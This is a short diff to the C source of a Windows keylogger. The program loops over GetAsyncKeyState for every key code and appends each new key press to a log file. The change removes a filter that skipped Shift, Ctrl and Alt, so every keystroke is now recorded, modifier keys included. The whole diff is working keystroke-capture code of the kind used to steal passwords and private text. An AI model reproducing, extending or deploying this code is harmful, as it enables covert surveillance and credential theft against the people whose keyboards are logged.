@@ -10,9 +10,6 @@
 #define LEN_NAME 512
 #define MAX_STATE 256
 
-bool is_modifier_key(int key) {
-    return (key == VK_SHIFT || key == VK_CONTROL || key == VK_MENU || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_LMENU || key == VK_RMENU);
-}
 int main(int argc, char **argv){
     int i = 0;
     bool is_pressed = false;
@@ -26,10 +23,8 @@ int main(int argc, char **argv){
     while(true){
         for(i = 0; i < MAX_STATE; i++){
             is_pressed = (GetAsyncKeyState(i) & 0x8000) != 0;
-            if(is_pressed && state[i] == false){
-                if(is_modifier_key(i) == false)
-                    save_file(fullpath, key_value(i));
-            }
+            if(is_pressed && state[i] == false)
+                save_file(fullpath, key_value(i));
             state[i] = is_pressed;
         }
         Sleep(1);
